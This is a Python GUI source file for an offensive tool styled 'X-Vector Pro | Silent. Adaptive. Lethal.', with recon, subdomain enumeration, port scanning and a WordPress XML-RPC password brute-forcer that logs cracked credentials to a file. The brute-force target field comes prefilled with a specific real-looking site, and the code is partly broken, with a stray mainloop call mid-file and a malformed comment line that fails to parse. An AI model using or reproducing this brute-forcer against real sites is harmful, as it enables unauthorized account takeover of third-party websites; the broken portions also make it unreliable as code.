import customtkinter as ctk
from tkinter import filedialog, messagebox
import threading
import socket
from queue import Queue
# === Setup ===
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

app = ctk.CTk()
app.geometry("900x650")
app.title("X-Vector Pro | Silent. Adaptive. Lethal.")

# === Tabbed Layout ===
tabs = ctk.CTkTabview(app, width=880, height=620)
tabs.pack(padx=10, pady=10)

# === Add Tabs ===
recon_tab = tabs.add("Recon")
scanner_tab = tabs.add("Scanner")
brute_tab = tabs.add("Brute Force")
exploit_tab = tabs.add("Exploits")
logs_tab = tabs.add("Logs")
settings_tab = tabs.add("Settings")

# =====================
# === BRUTE FORCE TAB
# =====================
def run_brute_force():
    target = target_entry.get().strip()
    usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines()]
    wordlist_path = wordlist_entry.get().strip()

    if not target or not usernames or not wordlist_path:
        messagebox.showerror("Error", "Please fill all fields.")
        return

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        messagebox.showerror("File Error", f"Cannot read password list:\n{e}")
        return

    log_box.insert("end", "[*] Starting brute force...\n")
    server = xmlrpc.client.ServerProxy(target)

    for user in usernames:
        log_box.insert("end", f"\n[*] Trying user: {user}\n")
        for password in passwords:
            try:
                resp = server.wp.getUsersBlogs(user, password)
                if resp:
                    hit = f"[+] HIT: {user}:{password}\n"
                    log_box.insert("end", hit)
                    with open("hits.txt", "a") as hit_file:
                        hit_file.write(f"{user}:{password}\n")
                    break
            except xmlrpc.client.Fault:
                pass
            except Exception as e:
                log_box.insert("end", f"[-] Error with {user}: {e}\n")
                break
    log_box.insert("end", "[*] Brute force finished.\n")

def browse_wordlist():
    path = filedialog.askopenfilename()
    if path:
        wordlist_entry.delete(0, "end")
        wordlist_entry.insert(0, path)

import xmlrpc.client  # moved up for logic reuse

ctk.CTkLabel(brute_tab, text="Target URL (https://example.com/xmlrpc.php)").pack(pady=5)
target_entry = ctk.CTkEntry(brute_tab, width=700)
target_entry.insert(0, "https://www.zayachek.com/xmlrpc.php")
target_entry.pack()

ctk.CTkLabel(brute_tab, text="Usernames (one per line)").pack(pady=5)
usernames_box = ctk.CTkTextbox(brute_tab, height=100, width=700)
usernames_box.insert("0.0", "admin\neditor\nauthor")
usernames_box.pack()

ctk.CTkLabel(brute_tab, text="Password List").pack(pady=5)
wordlist_frame = ctk.CTkFrame(brute_tab)
wordlist_frame.pack()
wordlist_entry = ctk.CTkEntry(wordlist_frame, width=500)
wordlist_entry.pack(side="left", padx=5)
browse_btn = ctk.CTkButton(wordlist_frame, text="Browse", command=browse_wordlist)
browse_btn.pack(side="left")

start_btn = ctk.CTkButton(brute_tab, text="Start Brute Force", fg_color="green", hover_color="darkgreen",
                          command=lambda: threading.Thread(target=run_brute_force).start())
start_btn.pack(pady=10)

log_box = ctk.CTkTextbox(brute_tab, height=200, width=700)
log_box.pack()

# ==========================
# === RECON TAB
# ==========================
import socket
import requests
import tldextract

def run_recon():
    target = recon_url_entry.get().strip()
    if not target:
        messagebox.showerror("Error", "Enter a target URL.")
        return

    recon_output.delete("0.0", "end")
    recon_output.insert("end", f"[*] Starting recon on {target}...\n")

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (X-Vector Recon Bot)"
        }
        r = requests.get(target, headers=headers, timeout=10)

        # Server Headers
        recon_output.insert("end", "\n--- Headers ---\n")
        for key, value in r.headers.items():
            recon_output.insert("end", f"{key}: {value}\n")

        # Title
        if "<title>" in r.text:
            title = r.text.split("<title>")[1].split("</title>")[0].strip()
            recon_output.insert("end", f"\n[*] Title: {title}\n")

        # CMS Detection
        recon_output.insert("end", "\n--- CMS Detection ---\n")
        if "wp-content" in r.text or "/wp-login.php" in r.text:
            recon_output.insert("end", "[+] WordPress Detected\n")
        elif "Joomla!" in r.text:
            recon_output.insert("end", "[+] Joomla Detected\n")
        elif "Drupal" in r.text:
            recon_output.insert("end", "[+] Drupal Detected\n")
        else:
            recon_output.insert("end", "[-] CMS Not Identified\n")

        # IP + Domain Info
        extracted = tldextract.extract(target)
        base_domain = ".".join(part for part in [extracted.domain, extracted.suffix] if part)
        ip = requests.get(f"https://dns.google/resolve?name={base_domain}&type=A").json()
        if "Answer" in ip:
            ip_addr = ip["Answer"][0]["data"]
            recon_output.insert("end", f"\n[*] IP Address: {ip_addr}\n")

    except Exception as e:
        recon_output.insert("end", f"[!] Recon failed: {e}\n")
def subdomain_scan():
    domain = recon_url_entry.get().strip()
    if not domain:
        messagebox.showerror("Error", "Enter a target domain.")
        return

    recon_output.insert("end", "\n[*] Starting subdomain scan...\n")

    wordlist = [
        "admin", "dev", "mail", "webmail", "test", "vpn", "portal",
        "beta", "staging", "api", "cpanel", "dashboard", "internal"
    ]

    # extract clean domain
    extracted = tldextract.extract(domain)
    base_domain = ".".join(part for part in [extracted.domain, extracted.suffix] if part)

    found = 0
    for sub in wordlist:
        subdomain = f"{sub}.{base_domain}"
        try:
            ip = socket.gethostbyname(subdomain)
            recon_output.insert("end", f"[+] Found: {subdomain} -> {ip}\n")
            found += 1
        except socket.gaierror:
            pass  # not resolved

    if found == 0:
        recon_output.insert("end", "[-] No subdomains found.\n")
    else:
        recon_output.insert("end", f"[*] Subdomain scan complete: {found} found\n")
# === Recon UI Layout ===
ctk.CTkLabel(recon_tab, text="Target URL (https://example.com)").pack(pady=5)
recon_url_entry = ctk.CTkEntry(recon_tab, width=700)
recon_url_entry.pack()
ctk.CTkButton(recon_tab, text="Scan Subdomains", command=lambda: threading.Thread(target=subdomain_scan).start()).pack(pady=5)
ctk.CTkButton(recon_tab, text="Run Recon", command=lambda: threading.Thread(target=run_recon).start()).pack(pady=10)

recon_output = ctk.CTkTextbox(recon_tab, height=400, width=800)
recon_output.pack()
# === Start GUI ===
app.mainloop()
# ==================
 ===  PORT SCAN TAB
# ==================
def run_port_scan():
    target = scanner_target_entry.get().strip()
    if not target:
        messagebox.showerror("Error", "Enter a valid target IP or domain.")
        return

    scanner_output.delete("0.0", "end")
    scanner_output.insert("end", f"[*] Starting port scan on {target}...\n")

    def scan_worker():
        while not q.empty():
            port = q.get()
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    result = s.connect_ex((target, port))
                    if result == 0:
                        scanner_output.insert("end", f"[+] Port {port} is open\n")
            except Exception as e:
                scanner_output.insert("end", f"[-] Error on port {port}: {e}\n")
            q.task_done()

    # Common 100 ports
    top_ports = [
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723,
        3306, 3389, 5900, 8080, 8443, 8888, 8000, 8081, 8880, 10000, 9200, 5432,
        389, 137, 138, 139, 2049, 1521, 465, 993, 995, 1025, 49152, 49153
    ]

    q = Queue()
    for port in top_ports:
        q.put(port)

    thread_count = 100
    for _ in range(thread_count):
        t = threading.Thread(target=scan_worker, daemon=True)
        t.start()

    q.join()
    scanner_output.insert("end", "[*] Port scan finished.\n")
    ctk.CTkLabel(scanner_tab, text="Target IP or Domain").pack(pady=5)
scanner_target_entry = ctk.CTkEntry(scanner_tab, width=500)
scanner_target_entry.pack()

ctk.CTkButton(scanner_tab, text="Start Port Scan", command=lambda: threading.Thread(target=run_port_scan).start()).pack(pady=10)

scanner_output = ctk.CTkTextbox(scanner_tab, height=400, width=800)
scanner_output.pack()
